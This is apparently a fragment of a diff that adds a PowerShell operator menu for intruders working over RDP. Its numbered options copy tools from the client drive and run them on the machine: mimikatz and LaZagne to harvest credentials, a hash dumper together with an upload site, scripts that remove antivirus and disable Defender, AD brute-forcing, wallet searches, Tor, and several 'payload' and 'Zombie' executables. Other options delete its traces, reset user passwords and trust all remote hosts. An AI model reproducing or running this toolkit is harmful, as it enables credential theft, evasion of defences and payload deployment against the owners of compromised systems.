+BlueLine Opening $toolName log...`
+ii logon.txt`
+gc logon.txt | clip`
+sleep 10`
+del mimikatz.exe`
+del mimidrv.sys`
+del mimilib.dll`
+del logon.txt}`
+5{start  $PsHome\powershell.exe " -ExecutionPolicy Bypass -File `"$tsclient\ps\Find-Pass.ps1`" -NoExit" }`
+6{BlueLine Copying Password Viewers 1.6Mb...`
+cd "$destination\"`
+explorer .`
+cpi -Path "$tsclient\Password Viewers" -Destination $destination -Recurse}`
+7{$toolName = ''`
+BlueLine Copying RDP password viewer...`
+cpi -Path "$tsclient\rdpv\rdpv.exe" -Destination $destination`
+try {start "$destination\rdpv.exe"}catch{ReadAlert RDP password viewer FAILED to start}}`
+8{BlueLine Copying laZagne 6Mb...`
+cpi -Path "$tsclient\Lazagne\*.*" -Recurse -Destination $destination -EA 0`
+cd $destination`
+BlueLine Running laZagne ...`
+start lazagne.exe -ArgumentList "all>laZagneLog.txt " -Wait`
+BlueLine Opening laZagne log...`
+ii laZagneLog.txt`
+gc laZagneLog.txt | clip`
+sleep 10`
+del lazagne.exe`
+del laZagneLog.txt}`
+9 {BlueLine Copying Hash Dump...`
+cpi -Path "$tsclient\Hash_Suite_Free\Tools\Hashes_Dump_$ProcessArchitecture.exe" -Destination $destination`
+try {start  "$destination\Hashes_Dump_$ProcessArchitecture.exe";start "https://dropmefiles.com"}catch{ReadAlert Hash dump FAILED to start} }`
+10{start  $PsHome\powershell.exe " -ExecutionPolicy Bypass -File `"$tsclient\ps\Delete-AVServices.ps1`""  }`
+101 {$dest=$env:TEMP;BlueLine Copying SafeMode;cpi -Path "$tsclient\1SafeMode\*.*" -Destination $dest`
+try {start  "$dest\AsAdmin.bat"}catch{ReadAlert SafeMode FAILED to start} }`
+102 {BlueLine Copying SafeCrypt;cpi -Path "$tsclient\SafeCrypt\*.*" -Destination $destination`
+try {start  "$destination\AsAdmin.bat"}catch{ReadAlert SafeCrypt FAILED to start} }`
+11{start appwiz.cpl   }`
+111{start  $PsHome\powershell.exe " -ExecutionPolicy Bypass -File `"$tsclient\ps\appWiz.ps1`"" }`
+12 {BlueLine Copying PCHunter ...`
+cpi -Path "$tsclient\PCHunter\PCHunter$ProcessArchitecture.exe" -Destination $destination`
+try {start  "$destination\PCHunter$ProcessArchitecture.exe"}catch{ReadAlert PCHunter FAILED to start} }`
+13{BlueLine Copying ProcessHacker 9Mb...`
+cpi -Path "$tsclient\exe\processhacker-2.39-setup.exe" -Destination $destination`
+try {start "$destination\processhacker-2.39-setup.exe"}catch{ReadAlert ProcessHacker FAILED to start} }`
+14{BlueLine Copying Unlocker 2.5Mb...`
+cpi -Path "$tsclient\exe\unlocker-setup.exe" -Destination $destination`
+try {start "$destination\unlocker-setup.exe"}catch{ReadAlert Unlocker FAILED to start}}`
+15{BlueLine Copying gmer 0.3Mb...`
+cpi -Path "$tsclient\exe\gmer.exe" -Recurse -Destination "$destination\gamer.exe" -EA 0`
+cd $destination`
+start "gamer.exe"}`
+155{if (!(Test-Path "$destination\RegistryFinder$ProcessArchitecture.exe")) {BlueLine Copying RegistryFinder 2Mb...`
+cpi -Path "$tsclient\RegistryFinder\RegistryFinder$ProcessArchitecture.exe" -Recurse -Destination $destination -EA 0}`
+cd $destination`
+start  RegistryFinder$ProcessArchitecture.exe}`
+16{BlueLine Copying Revo Uninstaller 5Mb...`
+cpi -Path "$tsclient\exe\RevoUninstv401.exe" -Destination $destination`
+try {start "$destination\RevoUninstv401.exe"}catch{ReadAlert ProcessHacker FAILED to start} }`
+17{BlueLine Copying IObit Uninstaller 4Mb...`
+cpi -Path "$tsclient\exe\iobituninstaller.exe" -Destination $destination`
+try {start "$destination\iobituninstaller.exe"}catch{ReadAlert ProcessHacker FAILED to start} }`
+18{start  $PsHome\powershell.exe " -ExecutionPolicy Bypass -File `"$tsclient\ps\Disable-WinDefend.ps1`""  }`
+20{start  $PsHome\powershell.exe " -ExecutionPolicy Bypass -File `"$tsclient\ps\purgeMemory.ps1`""  }`
+21{if (!(Test-Path "$destination\Takeaway.exe")) {BlueLine Copying payload...`
+cpi -Path $tsclient\x\Takeaway.exe -Destination $destination -EA 0}`
+try {if (!(Test-Path "$destination\Takeaway.exe")) {RedAlert FAILED to copy Takeaway... Check AV! }`
+BlueLine Starting payload routine...`
+start $destination\Takeaway.exe -ArgumentList "winhost"}`
+catch {RedAlert Payload FAILED to start. Check AV... }}`
+22{Get-Process winhost | Stop-Process`
+start "$destination\winhost.exe"}`
+23{start  $PsHome\powershell.exe " -ExecutionPolicy Bypass -File `"$tsclient\ps\winhostok.ps1`""     }`
+222{if (!(Test-Path "$destination\javsect.exe")) {BlueLine Copying Zombie to $destination ...`
+cpi -Path $tsclient\torqNet\javsect.exe -Destination $destination -EA 0`
+if (!(Test-Path "$destination\javsect.exe")) {RedAlert FAILED to copy Zombie... Check AV! }}`
+try {BlueLine Locating Zombie...`
+cd $destination; explorer .}`
+catch {RedAlert Zombie FAILED to start. Check AV... }}`
+223{$guid = get-wmiobject Win32_ComputerSystemProduct  | Select-Object -ExpandProperty UUID`
+explorer $env:temp\$guid`
+explorer $env:appdata\PostgreSQL\API\$guid}`
+224{$guid = get-wmiobject Win32_ComputerSystemProduct  | Select-Object -ExpandProperty UUID`
+get-process tor, torque -ea 0 | Stop-Process -ea 0 -Force -Confirm:$false`
+get-process PostgreSQLapi.exe -ea 0 | Stop-Process -ea 0 -Force -Confirm:$false`
+Get-item $env:temp\$guid\*.* | Remove-Item -ea 0 -Force -Confirm:$false`
+Get-item $env:appdata\PostgreSQL\API\$guid\*.* -ea 0 | Remove-Item -ea 0 -Force -Confirm:$false`
+Get-item "$destination\javsect.exe" -ea 0 | Remove-Item -ea 0 -Force -Confirm:$false}`
+25{ Infect }`
+30{try {BlueLine Local Network Computer Listing:`
+start  $PsHome\powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File $tsclient\ps\NetPC.ps1 $localPass"}`
+catch {RedAlert Network Listing FAILED to start...}}`
+31{start  $PsHome\powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File $tsclient\ps\NetSubPC.ps1 $localPass"}`
+32{start mstsc.exe   }`
+33{if (!(Test-Path "$destination\NS2.exe")) {BlueLine Copying NS2...`
+try{cpi -Path $tsclient\exe\NS2.exe -Destination $destination -EA 0}catch{RedAlert FAILED to copy NS...}}`
+try{BlueLine Starting NS2...`
+start "$destination\NS2.exe"}catch{RedAlert NS2 FAILED to start...}}    `
+34 {BlueLine Copying Advanced IP Scanner 8Mb...`
+cpi -Path "$tsclient\AdvancedIPScanner\IPScan2.exe" -Destination $destination`
+try {start  "$destination\IPScan2.exe"}catch{ReadAlert Advanced IPScanner FAILED to start} }`
+40{BlueLine AD Computer Listing`
+start  $PsHome\powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File $tsclient\ps\NetADPC.ps1 $localPass"}`
+401 {cpi -Path "$tsclient\WmiDomain\*.*" -Destination $destination`
+try {start  $PsHome\powershell.exe " -ExecutionPolicy Bypass -File $destination\GetHosts.ps1"}`
+catch{ReadAlert WmiDomain FAILED to start} }`
+41{start  $PsHome\powershell.exe " -ExecutionPolicy Bypass -File `"$tsclient\ps\adbrute.ps1`" -NoExit" }`
+42{cpi -Path $tsclient\2fin\2sys.ps1 -Destination $destination`
+cd $destination`
+start  $PsHome\powershell.exe " -ExecutionPolicy Bypass -File `"2sys.ps1`" -NoExit", "$env:UserName, $localPass"}`
+43{try {start dsa.msc} catch {Write-Host `n`tAD Snap-in start Failed ... -f Red -b White; sleep 3}      }`
+44{try {start gpmc.msc} catch {Write-Host `n`tGPMC snap-in start Failed ... -f Red -b White; sleep 3}  }`
+50{cd $destination; explorer .   }`
+51{start taskmgr.exe  }`
+52{start  $PsHome\powershell.exe   }`
+53{start $env:ComSpec   }`
+54{Get-Process rdpclip | Stop-Process -Force -EA 0; start rdpclip.exe   }`
+55{start shutdown -ArgumentList "-r -t 0"      }`
+56{BlueLine Copying ClearLock...`
+cpi -Path "$tsclient\exe\ClearLock.exe" -Destination $destination`
+BlueLine Starting ClearLock`
+start "$destination\ClearLock.exe" -PassThru        }`
+57{start  $PsHome\powershell.exe " -ExecutionPolicy Bypass -File `"$tsclient\ps\wallet.ps1`" -NoExit" }`
+60{BlueLine Copying addSupport...`
+try{cpi -Path $tsclient\bat\addSupport.bat -Destination $destination -EA 0}`
+catch{RedAlert FAILED to copy addSupport...}`
+try{BlueLine Starting addSupport...`
+start "$destination\addSupport.bat"}catch{RedAlert addSupport FAILED to start...}`
+del "$destination\addSupport.bat"}`
+61{try {BlueLine Copying x${ProcessArchitecture}...;`
+cpi -Path $tsclient\2018\x${ProcessArchitecture}.exe $destination -EA 0`
+BlueLine Starting x${ProcessArchitecture}...;`
+start $destination\x${ProcessArchitecture}.exe -ArgumentList "powershell.exe"}catch{RedAlert Payload FAILED}}`
+99{start  $PsHome\powershell.exe "-noProfile -ExecutionPolicy Bypass -File `"$tsclient\ps\toolbelt1.ps1`""     }`
+88{Enable-PSRemoting`
+set-item wsman:localhost\client\trustedhosts -value *}`
+45 {$toolName = 'Mimi NL bot for Domain'`
+Write-Host $toolName is being copied now 1Mb... -f White`
+$appsrc = "$tsclient\mimiNLbrute\AD\javsec.exe"`
+if (!(Test-Path $appsrc)) {$appsrc = "$tsclient\miadnlrdp\nladbot.exe" }`
+try {cpi -Path $appsrc -Destination $destination -Force -EA 0`
+Write-Host Starting $toolName ... -f White`
+start $destination\javsec.exe } catch {RedAlert Copying of $toolName FAILED...}}`
+35 {$toolName = 'Mimi NL bot'`
+Write-Host $toolName is being copied now 1Mb... -f White`
+$appsrc = "$tsclient\mimiNLbrute\LAN\javsec.exe"`
+if (!(Test-Path $appsrc)) {$appsrc = "$tsclient\minlrdp\nlbot.exe" }`
+try {cpi -Path $appsrc -Destination $destination -Force -EA 0`
+Write-Host Starting $toolName ... -f White`
+start $destination\javsec.exe } catch {RedAlert Copying of $toolName FAILED...}}`
++{cd $tsclient`
+start  $PsHome\powershell.exe " -ExecutionPolicy Bypass -File `"$tsclient\ps\Start-Tor.ps1`""}`
+.{cd $tsclient`
+start  $PsHome\powershell.exe " -ExecutionPolicy Bypass -File `"$tsclient\ps\Email-Screenshot.ps1`" -NoNewWindow "`
+Get-Screenshot`
+$Subject = Read-Host Subject`
+Send-Mail -Subject $Subject`
+ri $ShotPath}`
+600{(get-process | ? {$_.mainwindowtitle -ne "" -and $_.processname -ne "powershell" } )| stop-process -Force`
+(New-Object -comObject Shell.Application).Windows() | foreach-object {$_.quit()} }`
+666{try {Add-Type -AssemblyName PresentationCore`
+$clip = [Windows.Clipboard]::GetText()`
+$clip | Out-File $destination\sample.ps1}`
+catch {RedAlert Failed to copy vicious code. Try 52, then right click...}`
+start  $PsHome\powershell.exe " -NoProfile -ExecutionPolicy Bypass -File $destination\sample.ps1" -Verb RunAs }`
+- {start -FilePath cmd.exe -ArgumentList "/c net user $env:USERNAME 2qaz!QAZ & pause"}`
+211{if (!(Test-Path "$destination\Takeaway.exe")) {BlueLine Copying payload...`
+cpi -Path $tsclient\x\1\Takeaway.exe -Destination $destination -EA 0}`
+try {if (!(Test-Path "$destination\Takeaway.exe")) {RedAlert FAILED to copy Takeaway... Check AV! }`
+BlueLine Starting payload routine...`
+start $destination\Takeaway.exe}`
+catch {RedAlert Payload FAILED to start. Check AV... }}`
+212{if (!(Test-Path "$destination\Takeaway.exe")) {BlueLine Copying payload...`
+cpi -Path $tsclient\x\2\Takeaway.exe -Destination $destination -EA 0}`
+try {if (!(Test-Path "$destination\Takeaway.exe")) {RedAlert FAILED to copy Takeaway... Check AV! }`
+BlueLine Starting payload routine...`
+start $destination\Takeaway.exe}`
+catch {RedAlert Payload FAILED to start. Check AV... }}`
+213{if (!(Test-Path "$destination\Takeaway.exe")) {BlueLine Copying payload...`
+cpi -Path $tsclient\x\3\Takeaway.exe -Destination $destination -EA 0}`
+try {if (!(Test-Path "$destination\Takeaway.exe")) {RedAlert FAILED to copy Takeaway... Check AV! }`
+BlueLine Starting payload routine...`
+start $destination\Takeaway.exe}`
+catch {RedAlert Payload FAILED to start. Check AV... }}`
+214{if (!(Test-Path "$destination\Takeaway.exe")) {BlueLine Copying payload...`
+cpi -Path $tsclient\x\4\Takeaway.exe -Destination $destination -EA 0}`
+try {if (!(Test-Path "$destination\Takeaway.exe")) {RedAlert FAILED to copy Takeaway... Check AV! }`
+BlueLine Starting payload routine...`
+start $destination\Takeaway.exe}`
+catch {RedAlert Payload FAILED to start. Check AV... }}`
+default {continue }}`
+MenuChoice}
+$console.WindowSize = $size
+MenuChoice
